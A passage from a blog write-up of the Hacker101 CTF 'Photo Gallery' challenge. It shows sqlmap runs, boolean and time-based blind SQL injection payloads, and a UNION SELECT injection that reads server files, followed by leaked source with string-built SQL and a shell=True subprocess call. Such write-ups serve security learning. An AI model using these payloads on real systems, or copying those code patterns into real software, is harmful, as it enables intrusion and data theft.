<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width"/><meta charSet="utf-8"/><script async="" src="https://www.googletagmanager.com/gtag/js?id=G-TZ2VB384DV" class="jsx-2179548495"></script><script class="jsx-2179548495">
              window.dataLayer = window.dataLayer || [];
              function gtag(){dataLayer.push(arguments);}
              gtag('js', new Date());

            gtag('config', 'G-TZ2VB384DV');
            </script><title>Hacker101 CTF Photo Gallery writeup</title><meta name="copyright" content="lwlx. 2020"/><link rel="canonical" href="https://dev.lwlx.xyz/blog/hacker101-ctf-photo-gallery"/><meta name="description" content="A write up for the Photo Gallery [moderae] challenge"/><meta property="og:type" content="website"/><meta name="og:title" property="og:title" content="Hacker101 CTF Photo Gallery writeup"/><meta name="og:description" property="og:description" content="A write up for the Photo Gallery [moderae] challenge"/><meta property="og:site_name" content="dev.lwlx.xyz"/><meta property="og:url" content="https://dev.lwlx.xyz/blog/hacker101-ctf-photo-gallery"/><meta name="twitter:card" content="summary_large_image"/><meta name="twitter:title" content="Hacker101 CTF Photo Gallery writeup"/><meta name="twitter:description" content="A write up for the Photo Gallery [moderae] challenge"/><meta name="twitter:site" content="@0x0000005"/><meta name="twitter:creator" content="@0x0000005"/><meta name="twitter:image" content="https://dev.lwlx.xyz/hackerone/hackerone.png"/><meta property="og:image" content="https://dev.lwlx.xyz/hackerone/hackerone.png"/><noscript data-n-css="true"></noscript><link rel="preload" href="/_next/static/chunks/main-8b739faffb921dc9003b.js" as="script"/><link rel="preload" href="/_next/static/chunks/webpack-e067438c4cf4ef2ef178.js" as="script"/><link rel="preload" href="/_next/static/chunks/framework.9307f483d5f18bd6c60f.js" as="script"/><link rel="preload" href="/_next/static/chunks/f6078781a05fe1bcb0902d23dbbb2662c8d200b3.7fdc3fdfd8639afdba2f.js" as="script"/><link rel="preload" href="/_next/static/chunks/dd48059e07d9e613287d2b9ed68ceff9c6eda536.68cdf0c5bb973a7bf1ba.js" as="script"/><link rel="preload" href="/_next/static/chunks/pages/_app-c9314fadf4ee6195d8c6.js" as="script"/><link rel="preload" href="/_next/static/chunks/d906b6fe61298877255aebd66977199bd89a78bb.2ef5a9e4af48b2c5c21e.js" as="script"/><link rel="preload" href="/_next/static/chunks/pages/blog/%5Bblog%5D-16f9a6366aaee6d7fa83.js" as="script"/><style id="__jsx-2285729993">.blog-post{width:100%;max-width:1080px;}</style><style id="__jsx-1518321971">.devii-markdown p,.devii-markdown li{line-height:32px;font-size:21px;color:#333;overflow-wrap:break-word;}.devii-markdown h1,.devii-markdown h2,.devii-markdown h3,.devii-markdown h4,.devii-markdown h5,.devii-markdown h6{margin:0px;padding:0px;}.devii-markdown h1>a,.devii-markdown h2>a,.devii-markdown h3>a,.devii-markdown h4>a,.devii-markdown h5>a,.devii-markdown h6>a{-webkit-text-decoration:underline;text-decoration:underline;color:#f07693;}.devii-markdown hr{margin:20px 0px;opacity:0.35;}.devii-markdown h1{font-size:46px;line-height:56px;padding-top:30px;padding-bottom:10px;margin-top:30px;margin-bottom:30px;}.devii-markdown h2{padding-top:25px;padding-bottom:10px;margin-top:25px;margin-bottom:25px;}.devii-markdown h3{padding-top:20px;padding-bottom:10px;margin-top:20px;margin-bottom:20px;}.devii-markdown h4{padding-top:15px;padding-bottom:10px;margin-top:15px;margin-bottom:15px;}.devii-markdown h5{padding-top:10px;padding-bottom:10px;margin-top:10px;margin-bottom:10px;}.devii-markdown h6{padding-top:5px;padding-bottom:10px;margin-top:5px;margin-bottom:5px;}.devii-markdown p{padding:10px 0px;margin:10px 0px;}.devii-markdown li{padding:10px 0px;}.devii-markdown img{width:100%;border-radius:8px;box-shadow:0px 4px 30px #00000040;}.devii-markdown code{background-color:#f0769320;padding:3px 3px;border-radius:2px;font-size:1em;}.devii-markdown pre{margin:20px 0px !important;}.devii-markdown ol pre,.devii-markdown ol p{margin:0px 0px !important;}.devii-markdown blockquote{margin:0px;padding-left:1em;border-left:4px solid #F07693;}a{-webkit-text-decoration:underline;text-decoration:underline;color:#f07693;}@media only screen and (min-width:768px){.devii-markdown code{background-color:#f0769320;padding:3px 3px;border-radius:2px;font-size:16px;}}</style><style id="__jsx-2179548495">html,body,#__next{min-height:100%;padding:0;margin:0;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto, Oxygen,Ubuntu,Cantarell,Fira Sans,Droid Sans,Helvetica Neue, sans-serif;}*{box-sizing:border-box;}</style></head><body><div id="__next"><div style="display:flex;flex-direction:column;justify-content:center;align-items:center;min-height:100vh" class="jsx-2179548495"><div style="top:0;width:100%;height:48px;display:flex;flex-direction:row;align-items:center;justify-content:space-between;background-color:#04060A;padding:24px;font-size:12pt"><a href="/" style="text-decoration:none"><p style="color:#F07693">dev.lwlx.xyz</p></a><div style="flex:1"></div></div><div style="display:flex;flex-direction:row;justify-content:center;width:100%;padding:0px 0px 100px 0px" class="jsx-2285729993"><div class="jsx-2285729993 blog-post"><img style="width:100%;max-width:100%;margin:0px" src="/hackerone/hackerone.png" class="jsx-2285729993"/><div style="padding:50px 3vw 50px 3vw" class="jsx-2285729993"><h1 style="margin:10px 0px 10px 0px;padding:0;border:none;font-size:46px" class="jsx-2285729993">Hacker101 CTF Photo Gallery writeup</h1><hr style="height:2px;background:#1177AB;margin:25px 0px;border:none;border-radius:1px" class="jsx-2285729993"/><div style="margin:0px;padding:0px"><div style="display:flex;flex-direction:row;align-items:center;justify-content:flex-start"><img src="/profile.jpg" style="width:70px;height:70px;border-radius:35px;margin:0px 10px 0px 0px"/><div><p style="margin:2px;padding:0;line-height:1.2;font-size:11pt">lwlx</p><p style="opacity:0.6;margin:2px;padding:0;line-height:1.2;font-size:11pt">January 3rd, 2021</p><p style="margin:2px;padding:0;line-height:1.2;font-size:11pt"><a style="text-decoration:none;color:#1177AB" href="https://twitter.com/0x0000005">@0x0000005</a></p></div></div></div></div><div style="width:100%;padding:0px 3vw" class="jsx-2285729993"><div style="width:100%" class="jsx-1518321971 devii-markdown"><h1>Photo Gallery <em>[moderate]</em></h1><p>This is my Write Up for the &quot;Photo Gallery&quot; challenge of HackerOne&#x27;s CTF.</p><p>As usual we get a link to webpage, it seems to be an image gallery, but one of the images is broken.
The missing one is called <code>Invisible</code>, so lets look into that.</p><pre style="padding:1em;margin:.5em 0;overflow:auto;background:#04060a"><code style="background-color:transparent;color:#C9C0BE;width:1024px;white-space:pre"><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">1</span><span>http</span><span class="token token" style="color:#c9c0be;background:#000000">:</span><span class="token token" style="color:#c9c0be;background:#000000">/</span><span class="token token" style="color:#c9c0be;background:#000000">/</span><span class="token token" style="color:#4499ee">34.74</span><span class="token token" style="color:#4499ee">.105</span><span class="token token" style="color:#4499ee">.127</span><span class="token token" style="color:#c9c0be;background:#000000">/</span><span>ad3e8c7df9</span><span class="token token" style="color:#c9c0be;background:#000000">/</span></span></code></pre><p><img src="/hackerone/photogallery-start.png" alt="initial page" title="initial page"/></p><h2>Information gathering</h2><p>with Burp we were able to find that the server returns no content for this image.
images are loaded with a <code>GET</code> Request to the server like so:</p><p><code>GET /ad3e8c7df9/fetch?id=1 HTTP/1.1</code></p><p>this also aligns with the first tip we are provided:</p><blockquote><p>Hint 1: <em>Consider how you might build this system yourself. What would the <strong>query for fetch</strong> look like?</em></p></blockquote><p>naturally we start fuzzing the <code>id</code> parameter.</p><pre style="padding:1em;margin:.5em 0;overflow:auto;background:#04060a"><code style="background-color:transparent;color:#C9C0BE;width:1024px;white-space:pre"><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">1</span><span>GET </span><span class="token token" style="color:#c9c0be;background:#000000">/</span><span>ad3e8c7df9</span><span class="token token" style="color:#c9c0be;background:#000000">/</span><span>fetch?</span><span class="token token" style="color:#f07693">id</span><span class="token token" style="color:#c9c0be;background:#000000">=</span><span class="token token" style="color:#4499ee">4</span><span> HTTP</span><span class="token token" style="color:#c9c0be;background:#000000">/</span><span class="token token" style="color:#4499ee">1.1</span><span> </span><span class="token token" style="color:#4e5c63"># 404</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">2</span><span>GET </span><span class="token token" style="color:#c9c0be;background:#000000">/</span><span>ad3e8c7df9</span><span class="token token" style="color:#c9c0be;background:#000000">/</span><span>fetch?</span><span class="token token" style="color:#f07693">id</span><span class="token token" style="color:#c9c0be;background:#000000">=</span><span class="token token" style="color:#4499ee">0</span><span> HTTP</span><span class="token token" style="color:#c9c0be;background:#000000">/</span><span class="token token" style="color:#4499ee">1.1</span><span> </span><span class="token token" style="color:#4e5c63"># 404</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">3</span><span>GET </span><span class="token token" style="color:#c9c0be;background:#000000">/</span><span>ad3e8c7df9</span><span class="token token" style="color:#c9c0be;background:#000000">/</span><span>fetch?</span><span class="token token" style="color:#f07693">id</span><span class="token token" style="color:#c9c0be;background:#000000">=</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#4499ee">1</span><span> HTTP</span><span class="token token" style="color:#c9c0be;background:#000000">/</span><span class="token token" style="color:#4499ee">1.1</span><span> </span><span class="token token" style="color:#4e5c63"># 500</span></span></code></pre><p>alright, no quick wins, so let&#x27;s give it a try with fizzing using sqlmap.
Quickly we are able to see that the server seems to be vulnerable to some attack.</p><pre style="padding:1em;margin:.5em 0;overflow:auto;background:#04060a"><code style="background-color:transparent;color:#C9C0BE;width:1024px;white-space:pre"><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">1</span><span>sqlmap </span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span>u </span><span class="token token" style="color:#c9c0be;background:#000000">&quot;http://34.74.105.127/ad3e8c7df9/fetch?id=2&quot;</span></span></code></pre><p>This command runs for quite a while and will try to find vulnerabilities in the fetch endpoint.
when we are done we should know what to do next.</p><h2>Gathered Data</h2><h3>sqlmap identified the following injection point(s) with a total of 311 HTTP(s) requests:</h3><pre style="padding:1em;margin:.5em 0;overflow:auto;background:#04060a"><code style="background-color:transparent;color:#C9C0BE;width:1024px;white-space:pre"><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">1</span><span>Parameter</span><span class="token token" style="color:#999999">:</span><span> </span><span class="token token" style="color:#f07693">id</span><span> </span><span class="token token" style="color:#999999">(</span><span>GET</span><span class="token token" style="color:#999999">)</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">2</span><span>Type</span><span class="token token" style="color:#999999">:</span><span> boolean</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span>based blind
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">3</span><span>Title</span><span class="token token" style="color:#999999">:</span><span> AND boolean</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span>based blind </span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span> WHERE </span><span class="token token" style="color:#1177ab">or</span><span> HAVING clause
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">4</span><span>Payload</span><span class="token token" style="color:#999999">:</span><span> </span><span class="token token" style="color:#f07693">id</span><span class="token token" style="color:#c9c0be;background:#000000">=</span><span class="token token" style="color:#4499ee">2</span><span> AND </span><span class="token token" style="color:#4499ee">3567</span><span class="token token" style="color:#c9c0be;background:#000000">=</span><span class="token token" style="color:#4499ee">3567</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">5</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">6</span><span>Type</span><span class="token token" style="color:#999999">:</span><span> time</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span>based blind
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">7</span><span>Title</span><span class="token token" style="color:#999999">:</span><span> MySQL </span><span class="token token" style="color:#c9c0be;background:#000000">&gt;=</span><span> </span><span class="token token" style="color:#4499ee">5.0</span><span class="token token" style="color:#4499ee">.12</span><span> AND time</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span>based blind </span><span class="token token" style="color:#999999">(</span><span>query SLEEP</span><span class="token token" style="color:#999999">)</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">8</span><span>Payload</span><span class="token token" style="color:#999999">:</span><span> </span><span class="token token" style="color:#f07693">id</span><span class="token token" style="color:#c9c0be;background:#000000">=</span><span class="token token" style="color:#4499ee">2</span><span> AND </span><span class="token token" style="color:#999999">(</span><span>SELECT </span><span class="token token" style="color:#4499ee">8480</span><span> FROM </span><span class="token token" style="color:#999999">(</span><span>SELECT</span><span class="token token" style="color:#999999">(</span><span>SLEEP</span><span class="token token" style="color:#999999">(</span><span class="token token" style="color:#4499ee">5</span><span class="token token" style="color:#999999">)</span><span class="token token" style="color:#999999">)</span><span class="token token" style="color:#999999">)</span><span>KHRS</span><span class="token token" style="color:#999999">)</span></span></code></pre><pre style="padding:1em;margin:.5em 0;overflow:auto;background:#04060a"><code style="background-color:transparent;color:#C9C0BE;width:1024px;white-space:pre"><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">1</span><span class="token token" style="color:#999999">[</span><span class="token token" style="color:#4499ee">21</span><span class="token token" style="color:#999999">:</span><span class="token token" style="color:#4499ee">44</span><span class="token token" style="color:#999999">:</span><span class="token token" style="color:#4499ee">44</span><span class="token token" style="color:#999999">]</span><span> </span><span class="token token" style="color:#999999">[</span><span>INFO</span><span class="token token" style="color:#999999">]</span><span> the back</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span>end DBMS </span><span class="token token" style="color:#1177ab">is</span><span> MySQL
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">2</span><span>web server operating system</span><span class="token token" style="color:#999999">:</span><span> Linux Ubuntu
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">3</span><span>web application technology</span><span class="token token" style="color:#999999">:</span><span> Nginx </span><span class="token token" style="color:#4499ee">1.14</span><span class="token token" style="color:#4499ee">.0</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">4</span><span>back</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span>end DBMS</span><span class="token token" style="color:#999999">:</span><span> MySQL </span><span class="token token" style="color:#c9c0be;background:#000000">&gt;=</span><span> </span><span class="token token" style="color:#4499ee">5.0</span><span class="token token" style="color:#4499ee">.12</span><span> </span><span class="token token" style="color:#999999">(</span><span>MariaDB fork</span><span class="token token" style="color:#999999">)</span></span></code></pre><h3>Our Target Server:</h3><pre style="padding:1em;margin:.5em 0;overflow:auto;background:#04060a"><code style="background-color:transparent;color:#C9C0BE;width:1024px;white-space:pre"><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">1</span><span class="token token" style="color:#c9c0be;background:#000000">|</span><span> </span><span class="token token maybe-class-name">Type</span><span>      </span><span class="token token" style="color:#c9c0be;background:#000000">|</span><span> </span><span class="token token maybe-class-name">Service</span><span>      </span><span class="token token" style="color:#c9c0be;background:#000000">|</span><span> </span><span class="token token maybe-class-name">Version</span><span>                  </span><span class="token token" style="color:#c9c0be;background:#000000">|</span><span> </span><span class="token token maybe-class-name">Vulnerable</span><span class="token token" style="color:#c9c0be;background:#000000">?</span><span>    </span><span class="token token" style="color:#c9c0be;background:#000000">|</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">2</span><span></span><span class="token token" style="color:#c9c0be;background:#000000">|</span><span> </span><span class="token token" style="color:#c9c0be;background:#000000">--</span><span class="token token" style="color:#c9c0be;background:#000000">--</span><span class="token token" style="color:#c9c0be;background:#000000">--</span><span class="token token" style="color:#c9c0be;background:#000000">--</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span> </span><span class="token token" style="color:#c9c0be;background:#000000">|</span><span> </span><span class="token token" style="color:#c9c0be;background:#000000">--</span><span class="token token" style="color:#c9c0be;background:#000000">--</span><span class="token token" style="color:#c9c0be;background:#000000">--</span><span class="token token" style="color:#c9c0be;background:#000000">--</span><span class="token token" style="color:#c9c0be;background:#000000">--</span><span class="token token" style="color:#c9c0be;background:#000000">--</span><span> </span><span class="token token" style="color:#c9c0be;background:#000000">|</span><span> </span><span class="token token" style="color:#c9c0be;background:#000000">--</span><span class="token token" style="color:#c9c0be;background:#000000">--</span><span class="token token" style="color:#c9c0be;background:#000000">--</span><span class="token token" style="color:#c9c0be;background:#000000">--</span><span class="token token" style="color:#c9c0be;background:#000000">--</span><span class="token token" style="color:#c9c0be;background:#000000">--</span><span class="token token" style="color:#c9c0be;background:#000000">--</span><span class="token token" style="color:#c9c0be;background:#000000">--</span><span class="token token" style="color:#c9c0be;background:#000000">--</span><span class="token token" style="color:#c9c0be;background:#000000">--</span><span class="token token" style="color:#c9c0be;background:#000000">--</span><span class="token token" style="color:#c9c0be;background:#000000">--</span><span> </span><span class="token token" style="color:#c9c0be;background:#000000">|</span><span> </span><span class="token token" style="color:#c9c0be;background:#000000">--</span><span class="token token" style="color:#c9c0be;background:#000000">--</span><span class="token token" style="color:#c9c0be;background:#000000">--</span><span class="token token" style="color:#c9c0be;background:#000000">--</span><span class="token token" style="color:#c9c0be;background:#000000">--</span><span class="token token" style="color:#c9c0be;background:#000000">--</span><span class="token token" style="color:#c9c0be;background:#000000">--</span><span> </span><span class="token token" style="color:#c9c0be;background:#000000">|</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">3</span><span></span><span class="token token" style="color:#c9c0be;background:#000000">|</span><span> </span><span class="token token" style="color:#4499ee">OS</span><span>        </span><span class="token token" style="color:#c9c0be;background:#000000">|</span><span> </span><span class="token token maybe-class-name">Linux</span><span> </span><span class="token token maybe-class-name">Ubuntu</span><span> </span><span class="token token" style="color:#c9c0be;background:#000000">|</span><span> </span><span class="token token" style="color:#c9c0be;background:#000000">??</span><span>                       </span><span class="token token" style="color:#c9c0be;background:#000000">|</span><span> not focused    </span><span class="token token" style="color:#c9c0be;background:#000000">|</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">4</span><span></span><span class="token token" style="color:#c9c0be;background:#000000">|</span><span> </span><span class="token token maybe-class-name">Webserver</span><span> </span><span class="token token" style="color:#c9c0be;background:#000000">|</span><span> </span><span class="token token maybe-class-name">Nginx</span><span>        </span><span class="token token" style="color:#c9c0be;background:#000000">|</span><span> </span><span class="token token" style="color:#4499ee">1.14</span><span class="token token" style="color:#4499ee">.0</span><span>                   </span><span class="token token" style="color:#c9c0be;background:#000000">|</span><span> no             </span><span class="token token" style="color:#c9c0be;background:#000000">|</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">5</span><span></span><span class="token token" style="color:#c9c0be;background:#000000">|</span><span> </span><span class="token token maybe-class-name">Database</span><span>  </span><span class="token token" style="color:#c9c0be;background:#000000">|</span><span> </span><span class="token token maybe-class-name">MySQL</span><span>        </span><span class="token token" style="color:#c9c0be;background:#000000">|</span><span> </span><span class="token token" style="color:#c9c0be;background:#000000">&gt;=</span><span> </span><span class="token token" style="color:#4499ee">5.0</span><span class="token token" style="color:#4499ee">.12</span><span> </span><span class="token token" style="color:#999999">(</span><span class="token token maybe-class-name">MariaDB</span><span> fork</span><span class="token token" style="color:#999999">)</span><span> </span><span class="token token" style="color:#c9c0be;background:#000000">|</span><span> </span><span class="token token" style="color:#c7526d">yes</span><span> </span><span class="token token" style="color:#999999">(</span><span>id param</span><span class="token token" style="color:#999999">)</span><span> </span><span class="token token" style="color:#c9c0be;background:#000000">|</span></span></code></pre><p>Good, we got something, we know the server is vulnerable to multiple vulnerabilities such as a &#x27;boolean base blind&#x27;. We also found the Webserver is Nginx v1.14.0, which sadly has no usable vulnerabilities here. But with us now knowing the exact os and DB System used lets run sqlmap again with that info and see what we get.</p><pre style="padding:1em;margin:.5em 0;overflow:auto;background:#04060a"><code style="background-color:transparent;color:#C9C0BE;width:1024px;white-space:pre"><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">1</span><span>sqlmap </span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span>u </span><span class="token token" style="color:#c9c0be;background:#000000">&quot;http://34.74.105.127/ad3e8c7df9/fetch?id=2&quot;</span><span> </span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span>f </span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span>os</span><span class="token token" style="color:#c9c0be;background:#000000">=</span><span>linux </span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span>dbms</span><span class="token token" style="color:#c9c0be;background:#000000">=</span><span>mysql </span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span>level</span><span class="token token" style="color:#c9c0be;background:#000000">=</span><span class="token token" style="color:#4499ee">3</span><span> </span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span>o</span></span></code></pre><p>we dont really get any more useful information from here.
soo.. were kinda stuck lets just get another hint then:</p><blockquote><p>Hint 2: <em>Take a few minutes to consider the <strong>state of the union</strong></em></p></blockquote><p>The state uf the union? are they hinting on using UNION statements in the query?
<em>The UNION operator is used to combine the result-set of two or more SELECT statements.</em>
That seems like somethng we can make use of, so lets try and combine our query statements f.e. like this:</p><p>http://34.74.105.127/ad3e8c7df9/fetch?id=2 UNION SELECT &#x27;something&#x27;</p><p>but what do we look for? Lets get another hint.</p><blockquote><p>Hint 3: <em>This application runs on the <strong>uwsgi-nginx-flask-docker</strong> image</em></p></blockquote><p>uwsgi-nginx? hmm havent heard of that, but sems to be some kind of portable all in one flask. lets look for the docs.</p><p>https://uwsgi-docs.readthedocs.io/en/latest/Configuration.html#ini-files</p><blockquote><p>uWSGI can be configured using several different methods.</p></blockquote><p>YAML, JSON, INI are some supported formats -&gt; ini beeing the defualt so lets try getting the &#x27;uwsgi.ini&#x27; file?</p><p><img src="/hackerone/union-select-ini.png" alt="union select wiht burp repeater" title="union select wiht burp repeater"/></p><p>this returns us some configdata pointing to module main which is the entrypoint.</p><pre style="padding:1em;margin:.5em 0;overflow:auto;background:#04060a"><code style="background-color:transparent;color:#C9C0BE;width:1024px;white-space:pre"><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">1</span><span class="token token" style="color:#999999">[</span><span>uwsgi</span><span class="token token" style="color:#999999">]</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">2</span><span>module </span><span class="token token" style="color:#c9c0be;background:#000000">=</span><span> main
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">3</span><span></span><span class="token token" style="color:#f07693">callable</span><span> </span><span class="token token" style="color:#c9c0be;background:#000000">=</span><span> app</span></span></code></pre><p>so lets see if we can also fethc the main.py</p><pre style="padding:1em;margin:.5em 0;overflow:auto;background:#04060a"><code style="background-color:transparent;color:#C9C0BE;width:1024px;white-space:pre"><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">1</span><span>http</span><span class="token token" style="color:#999999">:</span><span class="token token" style="color:#c9c0be;background:#000000">//</span><span class="token token" style="color:#4499ee">35.190</span><span class="token token" style="color:#4499ee">.155</span><span class="token token" style="color:#4499ee">.168</span><span class="token token" style="color:#c9c0be;background:#000000">/</span><span>c947e97f6e</span><span class="token token" style="color:#c9c0be;background:#000000">/</span><span>fetch?</span><span class="token token" style="color:#f07693">id</span><span class="token token" style="color:#c9c0be;background:#000000">=</span><span class="token token" style="color:#4499ee">4</span><span class="token token" style="color:#c9c0be;background:#000000">%</span><span>20UNION</span><span class="token token" style="color:#c9c0be;background:#000000">%</span><span>20SELECT</span><span class="token token" style="color:#c9c0be;background:#000000">%</span><span class="token token" style="color:#4499ee">20</span><span class="token token" style="color:#c9c0be;background:#000000">%</span><span>27main</span><span class="token token" style="color:#999999">.</span><span>py</span><span class="token token" style="color:#c9c0be;background:#000000">%</span><span class="token token" style="color:#4499ee">27</span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span class="token token" style="color:#c9c0be;background:#000000">-</span></span></code></pre><p>Here we get lots of infos our <strong>first FLAG</strong> and the db connection settings:</p><h3>FLAG 0:</h3><pre style="padding:1em;margin:.5em 0;overflow:auto;background:#04060a"><code style="background-color:transparent;color:#C9C0BE;width:1024px;white-space:pre"><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">1</span><span class="token token" style="color:#c9c0be;background:#000000">%</span><span>s
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">2</span><span></span><span class="token token" style="color:#c9c0be;background:#000000">&#x27; % (pid, sanitize(ptitle)) fns.append(pfn) rep += &#x27;</span><span>Space used</span><span class="token token" style="color:#999999">:</span><span> </span><span class="token token" style="color:#c9c0be;background:#000000">&#x27; + subprocess.check_output(&#x27;</span><span>du </span><span class="token token" style="color:#c9c0be;background:#000000">-</span><span>ch </span><span class="token token" style="color:#c9c0be;background:#000000">%</span><span>s </span><span class="token token" style="color:#c9c0be;background:#000000">|</span><span class="token token" style="color:#c9c0be;background:#000000">|</span><span> exit </span><span class="token token" style="color:#4499ee">0</span><span class="token token" style="color:#c9c0be;background:#000000">&#x27; % &#x27;</span><span> </span><span class="token token" style="color:#c9c0be;background:#000000">&#x27;.join(&#x27;</span><span>files</span><span class="token token" style="color:#c9c0be;background:#000000">/</span><span class="token token" style="color:#c9c0be;background:#000000">&#x27; + fn for fn in fns), shell=True, stderr=subprocess.STDOUT).strip().rsplit(&#x27;</span><span>\n</span><span class="token token" style="color:#c9c0be;background:#000000">&#x27;, 1)[-1] + &#x27;</span><span class="token token" style="color:#c9c0be;background:#000000">&#x27; rep += &#x27;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2em;padding-right:1em;text-align:right;user-select:none;color:#4e5c63">3</span><span>\n</span><span class="token token" style="color:#c9c0be;background:#000000">&#x27; return home.replace(&#x27;</span><span>$ALBUMS$</span><span class="token token" style="color:#c9c0be;background:#000000">&#x27;, rep) @app.route(&#x27;</span><span class="token token" style="color:#c9c0be;background:#000000">/</span><span>fetch</span><span class="token token" style="color:#c9c0be;background:#000000">&#x27;) def fetch(): cur = getDb().cursor() if cur.execute(&#x27;</span><span>SELECT filename FROM photos WHERE </span><span class="token token" style="color:#f07693">id</span><span class="token token" style="color:#c9c0be;background:#000000">=</span><span class="token token" style="color:#c9c0be;background:#000000">%</span><span>s</span><span class="token token" style="color:#c9c0be;background:#000000">&#x27; % request.args[&#x27;</span><span class="token token" style="color:#f07693">id</span><span>&#x27;</span><span class="token token" style="color:#999999">]</span><span class="token token" style="color:#999999">)</span><span> </span><span class="token token" style="color:#c9c0be;background:#000000">==</span><span> </span><span class="token token" style="color:#4499ee">0</span><span class="token token" style="color:#999999">:</span><span> abort</span><span class="token token" style="color:#999999">(</span><span class="token token" style="color:#4499ee">404</span><span class="token token" style="color:#999999">)</span><span>
